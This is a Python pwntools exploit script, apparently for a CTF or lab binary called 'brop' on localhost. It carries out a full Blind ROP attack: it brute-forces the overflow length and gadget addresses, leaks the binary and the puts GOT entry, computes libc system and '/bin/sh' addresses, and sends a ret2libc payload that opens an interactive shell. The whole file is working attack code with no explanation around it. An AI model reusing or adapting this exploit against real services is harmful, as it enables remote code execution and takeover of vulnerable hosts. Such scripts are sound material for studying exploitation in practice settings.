# coding=utf8
from pwn import *
from LibcSearcher import *

local = 0


def get_buffer_length():
    buffer_length = 1
    while 1:
        sh = remote('127.0.0.1', 9999)
        try:
            sh.recvuntil(b'WelCome my friend,Do you know password?\n')
            sh.send(buffer_length * b'a')
            output = sh.recv()
            sh.close()
            if not output.startswith(b'No password'):
                return buffer_length - 1
            else:
                buffer_length += 1
        except EOFError:
            sh.close()
            return buffer_length - 1


def get_stop_addr(length):
    addr = 0x400500
    while addr < 0x401000:
        # sleep(0.1)
        if addr % 256 == 0:
            print(hex(addr))
        sh = remote('127.0.0.1', 9999)
        try:
            sh.recvuntil(b'password?\n')
            payload = b'a' * length + p64(addr)
            sh.sendline(payload)
            content = sh.recv()
            print(content)
            sh.close()
            print('gadget addr: {}'.format(hex(addr)))
            addr += 1
        except Exception:
            addr += 1
            sh.close()


def get_brop_gadget(length, stop_gadget, addr):
    sh = remote('127.0.0.1', 9999)
    try:
        sh.recvuntil(b'password?\n')
        payload = b'a' * length + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        print(content)
        # stop gadget returns memory
        if not content.startswith(b'WelCome'):
            return False
        return True
    except Exception:
        sh.close()
        return False


def check_brop_gadget(length, addr):
    sh = remote('127.0.0.1', 9999)
    try:
        sh.recvuntil(b'password?\n')
        payload = b'a' * length + p64(addr) + b'a' * 8 * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True


def find_brop_gadget(length, stop_gadget):
    addr = 0x400740
    while 1:
        if addr % 256 == 0:
            print(hex(addr))
        if get_brop_gadget(length, stop_gadget, addr):
            print('possible brop gadget: 0x%x' % addr)
            if check_brop_gadget(length, addr):
                print('success brop gadget: 0x%x' % addr)
                return addr
        addr += 1


def get_puts_addr(length, rdi_ret, stop_gadget):
    addr = 0x400500
    while 1:
        if addr % 256 == 0:
            print(hex(addr))
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil(b'password?\n')
        payload = b'A' * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
        sh.sendline(payload)
        try:
            content = sh.recv()
            print(content)
            if content.startswith(b'\x7fELF'):  # validate beginning part of file is printed
                print('find puts@plt addr: 0x%x' % addr)
                return addr
            sh.close()
            addr += 1
        except Exception:
            sh.close()
            addr += 1


def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
    sh = remote('127.0.0.1', 9999)
    payload = b'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
    sh.recvuntil(b'password?\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        try:
            data = data[:data.index(b"\nWelCome")]
        except Exception:
            data = data
        if data == b"":
            data = b'\x00'
        return data
    except Exception:
        sh.close()
        return None


def leak_function(length, rdi_ret, puts_plt, stop_gadget):
    leak_addr = 0x400000
    result = b""
    while leak_addr < 0x401000:
        if leak_addr % 256 == 0:
            print(hex(leak_addr))
        data = leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget)
        if data is None:
            continue
        else:
            result += data
            leak_addr += len(data)
    with open('code', 'wb') as f:
        f.write(result)


if __name__ == '__main__':
    context(os='linux', arch='amd64', log_level='warn')
    # length = get_buffer_length()
    length = 72
    # get_stop_addr(length)
    stop_gadget = 0x4005c0  # 0x40055e: release, 0x4005c0: main
    # brop_gadget = find_brop_gadget(length, stop_gadget)
    brop_gadget = 0x4007ba
    rdi_ret = brop_gadget + 9
    ret = brop_gadget + 14
    # puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
    puts_plt = 0x400560  # 0x400560
    # leak_function(length, rdi_ret, puts_plt, stop_gadget)
    puts_got = 0x601018

    if local:
        sh = process(['./brop'])
    else:
        sh = remote('127.0.0.1', 9999)
    sh.recvuntil(b'password?\n')
    payload = b'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)
    sh.sendline(payload)
    data = sh.recvuntil(b'\nWelCome', drop=True)
    puts_addr = u64(data.ljust(8, b'\x00'))
    print(data, hex(puts_addr))

    # libc6_2.31-0ubuntu9.9_amd64
    puts_offset = 0x084420
    system_offset = 0x052290
    str_bin_sh_offset = 0x1b45bd
    libc_base = puts_addr - puts_offset
    system_addr = libc_base + system_offset
    binsh_addr = libc_base + str_bin_sh_offset
    print(hex(libc_base), hex(system_addr), hex(binsh_addr))

    # libc = LibcSearcher('puts', puts_addr)
    # libc_base = puts_addr - libc.dump('puts')
    # system_addr = libc_base + libc.dump('system')
    # binsh_addr = libc_base + libc.dump('str_bin_sh')

    payload = b'a' * length + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)

    sh.sendline(payload)
    sh.interactive()
